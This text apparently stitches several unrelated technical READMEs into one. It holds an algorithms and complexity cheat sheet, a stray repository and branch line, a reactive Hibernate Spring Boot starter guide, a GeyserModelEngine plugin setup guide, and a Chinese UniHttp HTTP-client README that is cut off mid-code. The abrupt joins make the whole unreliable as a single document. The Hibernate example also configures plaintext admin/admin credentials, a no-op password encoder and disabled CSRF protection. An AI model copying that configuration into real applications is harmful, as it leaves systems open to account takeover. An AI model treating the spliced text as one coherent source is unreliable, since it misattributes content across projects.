![Alt text](/images/hash.png?raw=true ""Hashing"")

### Graph
* A *Graph* is an ordered pair of G = (V, E) comprising a set V of vertices or nodes together with a set E of edges or arcs,
  which are 2-element subsets of V (i.e. an edge is associated with two vertices, and that association takes the form of the
  unordered pair comprising those two vertices)
 * **Undirected Graph**: a graph in which the adjacency relation is symmetric. So if there exists an edge from node u to node
 v (u -> v), then it is also the case that there exists an edge from node v to node u (v -> u)
 * **Directed Graph**: a graph in which the adjacency relation is not symmetric. So if there exists an edge from node u to node v
 (u -> v), this does *not* imply that there exists an edge from node v to node u (v -> u)

## Algorithms

### Sorting

#### Quicksort
* Stable: `No`
* Time Complexity:
  * Best Case: `O(nlog(n))`
  * Worst Case: `O(n^2)`
  * Average Case: `O(nlog(n))`

![Alt text](/images/quicksort.gif?raw=true ""Quicksort"")

#### Mergesort
* *Mergesort* is also a divide and conquer algorithm. It continuously divides an array into two halves, recurses on both the
  left subarray and right subarray and then merges the two sorted halves
* Stable: `Yes`
* Time Complexity:
  * Best Case: `O(nlog(n))`
  * Worst Case: `O(nlog(n))`
  * Average Case: `O(nlog(n))`

![Alt text](/images/mergesort.gif?raw=true ""Mergesort"")

#### Bucket Sort
* *Bucket Sort* is a sorting algorithm that works by distributing the elements of an array into a number of buckets. Each bucket
  is then sorted individually, either using a different sorting algorithm, or by recursively applying the bucket sorting algorithm
* Time Complexity:
  * Best Case: `Ω(n + k)`
  * Worst Case: `O(n^2)`
  * Average Case:`Θ(n + k)`

![Alt text](/images/bucketsort.png?raw=true ""Bucket Sort"")

#### Radix Sort
* *Radix Sort* is a sorting algorithm that like bucket sort, distributes elements of an array into a number of buckets. However, radix
  sort differs from bucket sort by 're-bucketing' the array after the initial pass as opposed to sorting each bucket and merging
* Time Complexity:
  * Best Case: `Ω(nk)`
  * Worst Case: `O(nk)`
  * Average Case: `Θ(nk)`

### Graph Algorithms

#### Depth First Search
* *Depth First Search* is a graph traversal algorithm which explores as far as possible along each branch before backtracking
* Time Complexity: `O(|V| + |E|)`

![Alt text](/images/dfsbfs.gif?raw=true ""DFS / BFS Traversal"")

#### Breadth First Search
* *Breadth First Search* is a graph traversal algorithm which explores the neighbor nodes first, before moving to the next
  level neighbors
* Time Complexity: `O(|V| + |E|)`

![Alt text](/images/dfsbfs.gif?raw=true ""DFS / BFS Traversal"")

#### Topological Sort
* *Topological Sort* is the linear ordering of a directed graph's nodes such that for every edge from node u to node v, u
  comes before v in the ordering
* Time Complexity: `O(|V| + |E|)`

#### Dijkstra's Algorithm
* *Dijkstra's Algorithm* is an algorithm for finding the shortest path between nodes in a graph
* Time Complexity: `O(|V|^2)`

![Alt text](/images/dijkstra.gif?raw=true ""Dijkstra's"")

#### Bellman-Ford Algorithm
* *Bellman-Ford Algorithm* is an algorithm that computes the shortest paths from a single source node to all other nodes in a weighted graph
* Although it is slower than Dijkstra's, it is more versatile, as it is capable of handling graphs in which some of the edge weights are
  negative numbers
* Time Complexity:
  * Best Case: `O(|E|)`
  * Worst Case: `O(|V||E|)`

![Alt text](/images/bellman-ford.gif?raw=true ""Bellman-Ford"")

#### Floyd-Warshall Algorithm
* *Floyd-Warshall Algorithm* is an algorithm for finding the shortest paths in a weighted graph with positive or negative edge weights, but
  no negative cycles
* A single execution of the algorithm will find the lengths (summed weights) of the shortest paths between *all* pairs of nodes
* Time Complexity:
  * Best Case: `O(|V|^3)`
  * Worst Case: `O(|V|^3)`
  * Average Case: `O(|V|^3)`

#### Prim's Algorithm
* *Prim's Algorithm* is a greedy algorithm that finds a minimum spanning tree for a weighted undirected graph. In other words, Prim's find a
  subset of edges that forms a tree that includes every node in the graph
* Time Complexity: `O(|V|^2)`

![Alt text](/images/prim.gif?raw=true ""Prim's Algorithm"")

#### Kruskal's Algorithm
* *Kruskal's Algorithm* is also a greedy algorithm that finds a minimum spanning tree in a graph. However, in Kruskal's, the graph does not
  have to be connected
* Time Complexity: `O(|E|log|V|)`

![Alt text](/images/kruskal.gif?raw=true ""Kruskal's Algorithm"")

## Greedy Algorithms
* *Greedy Algorithms* are algorithms that make locally optimal choices at each step in the hope of eventually reaching the globally optimal solution
* Problems must exhibit two properties in order to implement a Greedy solution:
 * Optimal Substructure
    * An optimal solution to the problem contains optimal solutions to the given problem's subproblems
 * The Greedy Property
    * An optimal solution is reached by ""greedily"" choosing the locally optimal choice without ever reconsidering previous choices
* Example - Coin Change
    * Given a target amount V cents and a list of denominations of n coins, i.e. we have coinValue[i] (in cents) for coin types i from [0...n - 1],
      what is the minimum number of coins that we must use to represent amount V? Assume that we have an unlimited supply of coins of any type
    * Coins - Penny (1 cent), Nickel (5 cents), Dime (10 cents), Quarter (25 cents)
    * Assume V = 41. We can use the Greedy algorithm of continuously selecting the largest coin denomination less than or equal to V, subtract that
      coin's value from V, and repeat.
    * V = 41 | 0 coins used
    * V = 16 | 1 coin used (41 - 25 = 16)
    * V = 6  | 2 coins used (16 - 10 = 6)
    * V = 1  | 3 coins used (6 - 5 = 1)
    * V = 0  | 4 coins used (1 - 1 = 0)
    * Using this algorithm, we arrive at a total of 4 coins which is optimal

## Bitmasks
* Bitmasking is a technique used to perform operations at the bit level. Leveraging bitmasks often leads to faster runtime complexity and
  helps limit memory usage
* Test kth bit: `s & (1 << k);`
* Set kth bit: `s |= (1 << k);`
* Turn off kth bit: `s &= ~(1 << k);`
* Toggle kth bit: `s ^= (1 << k);`
* Multiple by 2<sup>n</sup>: `s << n;`
* Divide by 2<sup>n</sup>: `s >> n;`
* Intersection: `s & t;`
* Union: `s | t;`
* Set Subtraction: `s & ~t;`
* Extract lowest set bit: `s & (-s);`
* Extract lowest unset bit: `~s & (s + 1);`
* Swap Values:
             ```
                x ^= y;
                y ^= x;
                x ^= y;
             ```

## Runtime Analysis

#### Big O Notation
* *Big O Notation* is used to describe the upper bound of a particular algorithm. Big O is used to describe worst case scenarios

![Alt text](/images/bigO.png?raw=true ""Theta Notation"")

#### Little O Notation
* *Little O Notation* is also used to describe an upper bound of a particular algorithm; however, Little O provides a bound
  that is not asymptotically tight

#### Big Ω Omega Notation
* *Big Omega Notation* is used to provide an asymptotic lower bound on a particular algorithm

![Alt text](/images/bigOmega.png?raw=true ""Theta Notation"")

#### Little ω Omega Notation
* *Little Omega Notation* is used to provide a lower bound on a particular algorithm that is not asymptotically tight

#### Theta Θ Notation
* *Theta Notation* is used to provide a bound on a particular algorithm such that it can be ""sandwiched"" between
  two constants (one for an upper limit and one for a lower limit) for sufficiently large values

![Alt text](/images/theta.png?raw=true ""Theta Notation"")

anaconda875/reactive-hibernate-spring-boot-starter,main,"## This module's aim is to bring Reactive Hibernate support to Spring Data.
### Some features:
1. Useful Crud and Paging/Sorting methods (just like spring-data-jpa)
2. Custom query methods (findBy\*And\*OrderBy*, @Query(""FROM Abc"")), native queries are also supported
3. Support `@Transactional` (**propagation, readOnly, rollbackFor, timeout, noRollbackFor, ...**)
4. Support `@Modifying`, `@Param`
5. Support `@Lock`, `@EntityGraph`
6. Support `@NamedQuery`, `@NamedEntityGraph`
7. Support SpEL
8. Support Pagination
9. Support Auditing
10. Auto-config
11. Of course, it is truly non-blocking and compatible with Webflux

### Some remaining things:
1. Isolation level ([#875](https://github.com/hibernate/hibernate-reactive/issues/875) and [#432](https://github.com/eclipse-vertx/vertx-sql-client/issues/432)), savepoint
2. Stored procedure ([#1446](https://github.com/eclipse-vertx/vertx-sql-client/issues/1446) and [#637](https://github.com/hibernate/hibernate-reactive/issues/637))
3. Code optimization

## Getting started:
**1. Dependency and config:**
```xml
<dependency>
    <groupId>io.github.anaconda875</groupId>
    <artifactId>reactive-hibernate-spring-boot-starter</artifactId>
    <version>1.1.0</version>
</dependency>
```
Sometimes you might need to add (in case of dependencies conflict):
```xml
<dependency>
    <groupId>org.hibernate.orm</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>6.4.4.Final</version>
    <scope>compile</scope>
</dependency>
```
Add a suitable driver (for example, MySQL):
```xml
<dependency>
    <groupId>io.vertx</groupId>
    <artifactId>vertx-mysql-client</artifactId>
    <version>${your.version}</version>
</dependency>
```
Then add these (example) configs:
```properties
spring.jpa.properties.jakarta.persistence.jdbc.url=jdbc:mysql://localhost:3306/blogdb
spring.jpa.properties.jakarta.persistence.jdbc.user=mysql
spring.jpa.properties.jakarta.persistence.jdbc.password=mysql

spring.jpa.properties.hibernate.connection.pool_size=10

spring.jpa.properties.hibernate.enhancer.enableDirtyTracking=false
spring.jpa.properties.hibernate.enhancer.enableLazyInitialization=false
spring.jpa.properties.hibernate.enhancer.enableAssociationManagement=false
```
**2. Useful Crud and Paging/Sorting methods**: see [ReactiveCrudRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactiveCrudRepository.java) and [ReactivePagingAndSortingRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactivePagingAndSortingRepository.java)  
**3. Custom query methods (with `Pageable`, `@Lock`, `@EntityGraph`, `@Param`, `@Transactional`, `@Modifying`):**
```java
  @Lock(LockModeType.PESSIMISTIC_READ)
  @EntityGraph(attributePaths = {""content""})
  Flux<Post> findByContentOrderByCreatedAtDesc(String content);
```
```java
  @Query(""SELECT p FROM Post p WHERE p.content = ?1"")
  Mono<Page<Post>> findByContentCustomPage(String content, Pageable pageable);
```
```java
    @Query(
        nativeQuery = true,
        value =
            ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by "" +
                ""FROM posts WHERE id = ?1"")
    Mono<Post> nativeQ(UUID id);
```
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by ""
              + ""FROM posts WHERE content = :content"")
  Flux<Post> nativeQ2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(nativeQuery = true, value = ""DELETE from posts WHERE content = :content"")
  @Transactional
  Mono<?> deleteNative2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(""DELETE FROM Post p WHERE p.title = :title"")
  Mono<?> deleteCustom(@Param(""title"") String title);
```
**4. Support `@NamedQuery`, `@NamedEntityGraph`, Auditing:**
```java
@Data
@Entity
@NamedQueries(
    value = {
      @NamedQuery(
          name = ""Post.testNamed"",
          query = ""SELECT p FROM Post p WHERE p.content = :content"")
    })
@NamedEntityGraphs({
  @NamedEntityGraph(
      name = ""Post.testNamed"",
      attributeNodes = {@NamedAttributeNode(""title"")})
})
public class Post {

  @Id
  @GeneratedValue(generator = ""uuid"")
  @GenericGenerator(name = ""uuid"", strategy = ""uuid2"")
  UUID id;

  String title;
  String content;

  //<Auditing>
  @Column(name = ""created_at"")
  @CreatedDate
  LocalDateTime createdAt;

  @Column(name = ""last_modified_at"")
  @LastModifiedDate
  LocalDateTime lastModifiedAt;

  @Column(name = ""created_by"")
  @CreatedBy
  String createdBy;

  @Column(name = ""last_modified_by"")
  @LastModifiedBy
  String lastModifiedBy;
  //</Auditing>
}
```
```java
  //In repository
  @Lock(LockModeType.READ)
  @EntityGraph
  Mono<Page<Post>> testNamed(String content, Pageable pageable);
```
```java
//Config for Pagination, Auditing
@Configuration
@EnableReactiveJpaAuditing(auditorAwareRef = ""reactiveAuditorAware"")
public class Config {

  @Bean
  WebFluxConfigurer webFluxConfigurer() {
    return new WebFluxConfigurer() {
      @Override
      public void configureArgumentResolvers(ArgumentResolverConfigurer configurer) {
        configurer.addCustomResolver(new ReactivePageableHandlerMethodArgumentResolver());
      }
    };
  }

  @Bean
  ReactiveAuditorAware<String> reactiveAuditorAware() {
    return () ->
        ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(Authentication::getPrincipal)
            .map(UserDetails.class::cast)
            .map(UserDetails::getUsername);
  }

  @Bean
  SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http) {
    return http.csrf(ServerHttpSecurity.CsrfSpec::disable)
        .authorizeExchange(authorize -> authorize.anyExchange().authenticated())
        .httpBasic(Customizer.withDefaults())
        .build();
  }

  @Bean
  ReactiveUserDetailsService userDetailsService() {
    var isabelle = User.withUsername(""admin"").password(""admin"").authorities(""admin"").build();

    var bjorn =
        User.withUsername(""anonymous"").password(""anonymous"").authorities(""anonymous"").build();

    return new MapReactiveUserDetailsService(isabelle, bjorn);
  }

  @Bean
  PasswordEncoder passwordEncoder() {
    return NoOpPasswordEncoder.getInstance();
  }

  @Bean
  ReactiveEvaluationContextExtension securityExtension() {
    return new ReactiveEvaluationContextExtension() {

      @Override
      public String getExtensionId() {
        return ""webflux-security"";
      }

      @Override
      public Mono<? extends EvaluationContextExtension> getExtension() {
        return ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(SecurityEvaluationContextExtension::new);
      }
    };
  }
}

```
**5. SpEL:**
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by FROM posts "" +
              ""WHERE created_by = :#{authentication.name} AND title = :title "" +
              ""AND last_modified_by = :#{authentication.name}"")
  Mono<Post> testSpelNative2(@Param(""title"") String title);
```
```java
  @Query(
      ""SELECT p from #{#entityName} p WHERE p.lastModifiedBy = :#{authentication.name} AND p.title = ?1 AND p.createdBy = :#{authentication.name}"")
  @EntityGraph(attributePaths = {""createdBy""})
  Mono<Post> testSpel3(String title);
```

| GeyserUtils                    | [Github](https://github.com/GeyserExtensionists/GeyserUtils)                    | Get your Geyser to support calling some BE stuff  |
| GeyserModelEngine              | [Github](https://github.com/GeyserExtensionists/GeyserModelEngine)              | Make your bedrock support MEG4                            |
| GeyserModelEnginePackGenerator | [Github](https://github.com/GeyserExtensionists/GeyserModelEnginePackGenerator) | Help you automatically transform the model to generate resource packs        |

- Put `GeyserModelEngine` in the plugins folder (only Spigot or forks of Spigot supported)
- Put either `geyserutils-spigot` in your plugins folder aswell (`geyserutils-velocity`/`geyserutils-bungeecord` in your Velocity/Bungeecord plugins folder if you use it)
- Put `GeyserModelEnginePackGenerator` and `geyserutils-geyser` into `plugins/[Geyser-Folder]/extensions`

Start the server to generate the relevant configuration files, and then shut down the server to convert any models.

# Convert Models
This is old method to convert model:

`GeyserModelEnginePackGenerator` is capable of generating models all by itself. After generating it will also apply this pack automatically.

- First go to `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator/input/`
- Create a folder in this directory with the ID of the model. (this is the same name as your model within ModelEngine 4.)

<img src=""docsimg/example.jpg"" width=""500"">

> Each model should have a separate model folder
> Subfolders are supported if you want to categorize them

- Now use BlockBench and convert your model to a Bedrock Entity, this will allow you to export the Bedrock Geometry and Animations.
- Put the geometry, animations and texture file in this folder you've made.

<img src=""docsimg/example1.jpg"" width=""500"">

- Restart the server or reload geyser to start generating the resource pack.
- Go to  `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator`, and you should see your pack generated!

<img src=""docsimg/example2.jpg"" width=""500"">

- Final step, reload Geyser or restart the server to load the resource pack.
- Congratulations, you've completed this tutorial!

# Model Packer

This is new way to convert model
- Firstly, install [packer plugin](https://github.com/GeyserExtensionists/GeyserModelEngineBlockbenchPacker) for your blockbench.
- Then, open your bbmodel, go `File -> Export -> Export GeyserModelEngine Model`, you will get a zip, just unzip it to `input` folder.

# Tips

* Pay attention! The pack only regenerates when the number of models changes, you can technically speaking remove the generated_pack folder to force a reload aswell.
* You do not have to manually put the pack into the packs folder of Geyser, the extension is capable of loading the pack itself.
* Choose a right texture when use the packer.

# Current issues

* Multi-textures and Animated textures need use [a blockbench plugin] (https://github.com/GeyserExtensionists/GeyserModelEngineBlockbenchPacker) to export

* Please report any bugs

一个声明式的Http请求对接框架，能以极快的方式完成对一个第三方Http接口的对接和使用，只要配置一下即可重复使用，
不需要开发者去关注如何发送一个请求，如何去传递Http请求参数，以及如何对请求结果进行处理和反序列化，这些框架都帮你一一实现 
就像配置 `Spring的Controller` 那样简单，只不过相当于是反向配置而已

该框架更注重于如何保持高内聚和可读性高的代码情况下与快速第三方渠道接口进行对接和集合，
而非像传统编程式的Http请求客户端（比如HttpClient、Okhttp）那样专注于如何去发送和响应一个Http请求，二者并不冲突只是注重点不一样，UniHttp 目前底层也是用的Okhttp去发送请求。
与其说的是对接的Http接口，不如说是对接的第三方渠道，UniHttp可支持自定义接口渠道方HttpAPI注解以及一些自定义的对接和交互行为 ，为此扩展了发送和响应和反序列化一个Http请求接口的各种生命周期钩子需要开发者去自定义实现。



# 2、快速开始
## 2.1、引入依赖
```xml
    <dependency>
      <groupId>io.github.burukeyou</groupId>
      <artifactId>uniapi-http</artifactId>
      <version>0.0.8</version>
    </dependency>
```

## 2.2、对接接口
在类上标记@HttpAPI注解，用户表示定义一个Http接口的信息, 然后就可以去编写每个方法去对接每个接口。 
如下面两个方法的配置则对接了 GET http://localhost:8080/getUser和 POST http://localhost:8080/addUser 两个接口
方法返回值定义成Http响应body对应的类型即可，默认会使用fastjson反序列化Http响应body的值为该类型对象。

```java
@HttpApi(url = ""http://localhost:8080"")
interface UserHttpApi {
    
   @GetHttpInterface(""/getUser"")
   BaseRsp<String> getUser(@QueryPar(""name"") String param,@HeaderPar(""userId"") Integer id);
    
   @PostHttpInterface(""/addUser"")
   BaseRsp<Add4DTO> addUser(@BodyJsonPar Add4DTO req);
   
}
```

@QueryPar 表示将参数值放到Http请求的查询参数内

@HeaderPar    表示将参数值放到Http请求的请求头里

@BodyJsonPar 表示将参数值放到Http请求body内，并且content-type是application/json


1、getUser方法最终构建的Http请求报文为
```
GET http://localhost:8080/getUser?name=param
Header:
    userId: id
```
 
 
2、addUser最终构建的Http请求报文为 
```
        POST:  http://localhost:8080/addUser 
        Header: 
            Content-Type:   application/json
        Body:
            {""id"":1,""name"":""jay""}
```



## 2.3、声明定义的HttpAPI的包扫描路径

@UniAPIScan(""com.xxx.demo.api"") 会自动为改接口生成代理对象并且注入到Spring容器中，
之后只需要像使用Spring的其他bean一样，依赖注入使用即可

### 2.4 依赖注入使用即可

```java
@Service
class UserAppService {
    
    @Autowired
    private UserHttpApi userHttpApi;
    
    public void doSomething(){
        userHttpApi.getUser(""jay"",3);
    }
} 

```

# 3、说明介绍

##  @HttpApi注解
用于标记接口上，该接口上的方法会被代理，指定自定义的Http代理逻辑， 也可配置请求的url路径等等。

## @HttpInterface注解
用于配置一个接口的参数，包括请求方式、请求路径、请求头、请求cookie、请求查询参数等等

并且内置了以下请求方式的@HttpInterface，不必再每次手动指定请求方式
- @PostHttpInterface
- @PutHttpInterface
- @DeleteHttpInterface
- @GetHttpInterface

```java
    @PostHttpInterface(
            // 请求路径
            path = ""/getUser"",
            // 请求头
            headers = {""clientType:sys-app"",""userId:99""},
            // url查询参数 
            params = {""name=周杰伦"",""age=1""},
            // url查询参数拼接字符串
            paramStr = ""a=1&b=2&c=3&d=哈哈&e=%E7%89%9B%E9%80%BC"",
            // cookie 字符串
            cookie = ""name=1;sessionId=999""
    )
    BaseRsp<String> getUser();
```

##  各种@Par注解
以下各种Par后缀的注解，主要用于方法参数上，用于指定在发送请求时将参数值放到Http请求体的哪部分上。
为了方便描述，下文的普通值就是表示String，基本类型、基本类型的包装类型等类型


### @QueryPar注解
标记Http请求url的查询参数

支持以下方法参数类型的标记: 普通值、普通值集合、对象、Map 

```java
    @PostHttpInterface
    BaseRsp<String> getUser(@QueryPar(""id"")  String id,  //  普通值   
                            @QueryPar(""ids"") List<Integer> idsList, //  普通值集合
                            @QueryPar User user,  // 对象
                            @QueryPar Map<String,Object> map); // Map

    
```

如果类型是普通值或者普通值集合需要手动指定参数名，因为是当成单个查询参数传递
如果类型是对象或者Map是当成多个查询参数传递，字段名或者map的key名就是参数名，字段值或者map的value值就是参数值。


### @PathPar注解
标记Http请求路径变量参数，仅支持标记普通值类型

```java
    @PostHttpInterface(""/getUser/{userId}/detail"")
    BaseRsp<String> getUser(@PathPar(""userId"")  String id);  //  普通值
```


### @HeaderPar注解
标记Http请求头参数

支持以下方法参数类型： 对象、Map、普通值

```java
    @PostHttpInterface
    BaseRsp<String> getUser(@HeaderPar(""id"")  String id,  //  普通值   
                            @HeaderPar User user,  // 对象
                            @HeaderPar Map<String,Object> map); // Map

    
```

如果类型是普通值类型需要手动指定参数名，当成单个请求头参数传递


### @CookiePar注解
用于标记Http请求的cookie请求头

支持以下方法参数类型: Map、Cookie对象、字符串


```java
    @PostHttpInterface
    BaseRsp<String> getUser(@CookiePar(""id"")  String cookiePar,  //   普通值 （指定name）当成单个cookie键值对处理
                            @CookiePar String cookieString,  //  普通值 （不指定name），当成完整的cookie字符串处理
                            @CookiePar com.burukeyou.uniapi.http.support.Cookie cookieObj,  // 单个Cookie对象 
                            @CookiePar List<com.burukeyou.uniapi.http.support.Cookie> cookieList // Cookie对象列表
                            @CookiePar Map<String,Object> map); // Map

    
```

如果类型是字符串时，当指定参数名时，当成单个cookie键值对处理，如果不指定参数名当成完整的cookie字符串处理比如a=1;b=2;c=3
如果是Map当成多个cookie键值对处理。
如果类型是内置的 `com.burukeyou.uniapi.http.support.Cookie`对象当成单个cookie键值对处理



### @BodyJsonPar注解
用于标记Http请求体内容为json形式: 对应content-type为 application/json

支持以下方法参数类型: 对象、对象集合、Map、普通值、普通值集合


```java
    @PostHttpInterface
    BaseRsp<String> getUser(@BodyJsonPar  String id,                //  普通值
                            @BodyJsonPar  String[] id               //  普通值集合
                            @BodyJsonPar List<User> userList,       // 对象集合
                            @BodyJsonPar User user,                  // 对象
                            @BodyJsonPar Map<String,Object> map);    // Map
```

序列化和反序列化默认用的是fastjson，所以如果想指定别名，可以在字段上标记 @JSONField 注解取别名


### @BodyFormPar注解
用于标记Http请求体内容为普通表单形式: 对应content-type为 application/x-www-form-urlencoded

支持以下方法参数类型： 对象、Map、普通值


```java
    @PostHttpInterface
    BaseRsp<String> getUser(@BodyFormPar(""name"") String value,         //  普通值
                            @BodyFormPar User user,                   // 对象
                            @BodyFormPar Map<String,Object> map);    // Map
```

如果类型是普通值类型需要手动指定参数名，当成单个请求表单键值对传递


### BodyMultiPartPar注解
用于标记Http请求体内容为复杂形式: 对应content-type为 multipart/form-data

支持以下方法参数类型: 对象、Map、普通值、File对象


```java
    @PostHttpInterface
    BaseRsp<String> getUser(@BodyMultiPartPar(""name"") String value,         //  单个表单文本值
                            @BodyMultiPartPar User user,                   // 对象
                            @BodyMultiPartPar Map<String,Object> map,      // Map
                            @BodyMultiPartPar(""userImg"") File file);     // 单个表单文件值
```

如果参数类型是普通值或者File类型，当成单个表单键值对处理，需要手动指定参数名。
如果参数类型是对象或者Map，当成多个表单键值对处理。 如果字段值或者map的value参数值是File类型，则自动当成是文件表单字段传递处理


### @BodyBinaryPar注解
用于标记Http请求体内容为二进制形式: 对应content-type为 application/octet-stream

支持以下方法参数类型: InputStream、File、InputStreamSource

```java
    @PostHttpInterface
    BaseRsp<String> getUser(@BodyBinaryPar InputStream value,         
                            @BodyBinaryPar File user,                   
                            @BodyBinaryPar InputStreamSource map);    
```


### @ComposePar注解
这个注解本身不是对Http请求内容的配置，仅用于标记一个对象，然后会对该对象内的所有标记了其他@Par注解的字段进行嵌套解析处理，
目的是减少方法参数数量，支持都内聚到一起配置

支持以下方法参数类型: 对象

```java
    @PostHttpInterface
    BaseRsp<String> getUser(@ComposePar UserReq req);    
```

比如UserReq里面的字段可以嵌套标记其他@Par注解，具体支持的标记类型和逻辑与前面一致
```java
class UserReq {

    @QueryPar
    private Long id;

    @HeaderPar
    private String name;

    @BodyJsonPar
    private Add4DTO req;

    @CookiePar
    private String cook;
}
```



## 拿到原始的HttpResponse
HttpResponse表示Http请求的原始响应对象，如果业务需要关注拿到完整的Http响应，只需要在方法返回值包装返回即可。
如下面所示，此时`HttpResponse<Add4DTO>`里的泛型Add4DTO才是代表接口实际返回的响应内容，后续可直接手动获取

```java
    @PostHttpInterface(""/user-web/get"")
    HttpResponse<Add4DTO> get();
```

通过它我们就可以拿到响应的Http状态码、响应头、响应cookie等等，当然也可以拿到我们的响应body的内容通过getBodyResult方法

## 下载文件接口如何对接
对于若是下载文件的类型的接口，可将方法返回值定义为 HttpBinaryResponse、HttpFileResponse、HttpInputStreamResponse 的任意一种，
这样就可以拿到下载后的文件。

HttpBinaryResponse: 表示下载的文件内容以二进制形式返回，如果是大文件请谨慎处理，因为会存放在内存中

HttpFileResponse:  表示下载的文件内容以File对象返回，这时文件已经被下载到了本地磁盘

HttpInputStreamResponse: 表示下载的文件内容输入流的形式返回，这时文件其实还没被下载到客户端，调用者可以自行读取该输入流进行文件的下载



## HttpApiProcessor 生命周期钩子
HttpApiProcessor表示是一个发送和响应和反序列化一个Http请求接口的各种生命周期钩子，开发者可以在里面自定义编写各种对接逻辑。

目前提供了4种钩子,执行顺序流程如下:

```

                  postBeforeHttpMetadata                (请求发送前)在发送请求之前，对Http请求体后置处理
                         |
                         V
                  postSendingHttpRequest                (请求发送时)在Http请求发送时处理
                         |
                         V
               postAfterHttpResponseBodyString          (请求响应后)对响应body文本字符串进行后置处理
                         |
                         V
              postAfterHttpResponseBodyResult           (请求响应后)对响应body反序列化后的结果进行后置处理
                         |
                         V
              postAfterMethodReturnValue                (请求响应后)对代理的方法的返回值进行后置处理，类似aop的后置处理
```



1、postBeforeHttpMetadata: 可在发送http请求之前对请求体进行二次处理，比如加签之类

2、postSendHttpRequest:    Http请求发送时会回调该方法，可以在该方法执行自定义的发送逻辑或者打印发送日志

3、postAfterHttpResponseBodyString：   Http请求响应后，对响应body字符串进行进行后置处理，比如如果是加密数据可以进行解密

4、postAfterHttpResponseBodyResult：   Http请求响应后，对响应body反序列化后的对象进行后置处理，比如填充默认返回值

5、postAfterMethodReturnValue：    Http请求响应后，对代理的方法的返回值进行后置处理，类似aop的后置处理


其他
- HttpMetadata: 表示此次Http请求的请求体，包含请求url，请求头、请求方式、请求cookie、请求体、请求参数等等。
- HttpApiMethodInvocation: 继承自MethodInvocation， 表示被代理的方法调用上下文，可以拿到被代理的类，被代理的方法，被代理的HttpAPI注解、HttpInterface注解等信息


## 配置自定义的Http客户端
如果要自定义全局的Okhttp客户端,实现GlobalOkHttpClientFactory接口并注入spring的bean即可

```java
@Component
public class MyGlobalOkHttpClientFactory implements GlobalOkHttpClientFactory {
    private  final OkHttpClient client;

    public MyGlobalOkHttpClientFactory() {
        this.client = new OkHttpClient.Builder()
                .readTimeout(50, TimeUnit.SECONDS)
                .writeTimeout(50, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .connectionPool(new ConnectionPool(20,10, TimeUnit.MINUTES))
                .build();
    }
    
    @Override
    public OkHttpClient getHttpClient() {
        return client;
    }
}

```

@HttpApi也可自定义的不同Okhttp客户端， 可以实现OkHttpClientFactory接口并注入Spring，然后在@HttpApi注解上指定该实现类即可。
比如
```java
@Component
public class UserChannelOkHttpClientFactory implements OkHttpClientFactory {
    private  final OkHttpClient client;

    public UserChannelOkHttpClientFactory() {
        this.client = new OkHttpClient.Builder()
                .readTimeout(50, TimeUnit.SECONDS)
                .writeTimeout(50, TimeUnit.SECONDS)
                .connectTimeout(10, TimeUnit.SECONDS)
                .connectionPool(new ConnectionPool(20,10, TimeUnit.MINUTES))
                .build();
        log.info(""UserChannelOkHttpClientFactory client:{}"",client);
    }
    
    @Override
    public OkHttpClient getHttpClient() {
        return client;
    }
}
```

然后在配置到@HttpApi的httpClient属性即可
```java
@HttpApi(httpClient = UserChannelOkHttpClientFactory.class)
interface UserServiceApi {
    
}
```


# 4、企业级渠道对接实战
案例背景：假设现在需要对接一个某天气服务的所有接口，需要在请求cookie带上一个token字段和sessionId字段， 这两个字段的值需要每次接口调用前先手动调渠道方的一个特定的接口申请获取，token值在该接口返回值中返回，sessionId在该接口的响应头中返回
然后还需要在请求头上带上一个sign签名字段， 该sign签名字段生成规则需要用渠道方提供的公钥对所有请求体和请求参数进行加签生成。
然后还需要在每个接口的查询参数上都带上一个渠道方分配的客户端appId。

## 4.1 在application.yml中配置我们对接渠道方的信息

```yaml
channel:
  mtuan:
    # 请求域名
    url: http://127.0.0.1:8999
    # 分配的渠道appId
    appId: UUU-asd-01
    # 分配的公钥
    publicKey: fajdkf9492304jklfahqq
```

## 4.2、自定义该渠道方的HttpAPI注解
假设现在对接的是某团，所以叫@MTuanHttpApi吧，然后需要在该注解上标记@HttpApi注解，并且需要配置processor字段，需要去自定义实现一个HttpApiProcessor这个具体实现后续讲。
有了这个注解后就可以自定义该注解与对接渠道方相关的各种字段配置，当然也可以不定义。 注意这里url的字段是使用 @AliasFor(annotation = HttpApi.class)，
这样构建的HttpMetadata中会默认解析填充要请求体，不标记则也可自行处理。

```java
@Inherited
@Target({ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
@HttpApi(processor = MTuanHttpApiProcessor.class)
public @interface MTuanHttpApi {

    /**
     * 渠道方域名地址
     */
    @AliasFor(annotation = HttpApi.class)
    String url() default ""${channel.mtuan.url}"";

    /**
     * 渠道方分配的appId
     */
    String appId() default ""${channel.mtuan.appId}"";
}

```
```java
@Slf4j
@Component
public class MTuanHttpApiProcessor implements HttpApiProcessor<MTuanHttpApi> {
    
}
```



## 4.3 对接接口
有了@MTuanHttpApi注解之后就可以开始对接接口了，比如假设有两个接口要对接。一个就是前面说的获取令牌的接口。 一个是获取天气情况的接口。
为什么getToken方法返回值是 `HttpResponse`, 这是UniHttp内置的原始Http响应对象，方便我们去拿到原始Http响应体的一些内容（比如响应状态码、响应cookie）。 
其中的泛型BaseRsp<TokenDTO>才是实际的Http响应体反序列化后的内容。 而getCityWeather方法没有使用HttpResponse包装,
BaseRsp<WeatherDTO>只是单纯Http响应体反序列化后的内容，这是两者的区别。 后面会介绍 `HttpResponse`，其实大部份接口是不关注HttpResponse的可以不用去配置。

```java
@MTuanHttpApi
public interface WeatherApi {
    
    /**
     * 根据城市名获取天气情况
     */
